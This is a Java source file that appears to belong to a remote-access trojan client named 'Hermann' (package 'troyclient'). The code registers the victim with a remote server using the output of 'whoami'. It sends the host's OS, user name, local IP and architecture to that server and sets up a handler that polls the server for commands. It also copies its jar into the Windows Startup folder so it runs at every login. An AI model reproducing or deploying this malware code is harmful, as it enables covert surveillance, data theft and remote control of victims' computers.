package ch.lebois.troyclient.main;

import ch.lebois.troyclient.service.Console;
import ch.lebois.troyclient.service.DownloadService;
import ch.lebois.troyclient.service.Sender;
import ch.lebois.troyclient.service.WebHandler;
import java.io.File;
import java.net.InetAddress;
import java.net.UnknownHostException;

/**
 * Project: Hermann
 **/
public class ConfigureInit {


    private WebHandler webHandler;

    public static void main(String[] args) {
        File file = new File(System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
                "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
        System.out.println(file.getPath());
    }

    public WebHandler getWebHandler() {
        return webHandler;
    }

    public void configure(String url, String version) {
        GetContext.CLIENT_NAME = Console.execute("whoami").get(1).replace("\\", "-");
        GetContext.SENDER = new Sender(url);
        webHandler = new WebHandler(url + "/command/" + GetContext.CLIENT_NAME);
        getConstants(version);
        autostart();
    }

    private void autostart() {
        new DownloadService().download("file:///" + System.getProperty("user.dir") + "\\Hermann.jar",
                System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
                        "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Herman.jar"));
    }

    private void getConstants(String version) {
        GetContext.SENDER.send("os", System.getProperty("os.name"));
        GetContext.SENDER.send("user", System.getProperty("user.name"));
        try {
            GetContext.SENDER.send("ip", InetAddress.getLocalHost().getHostAddress());
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        GetContext.SENDER.send("arch", version);
    }
}
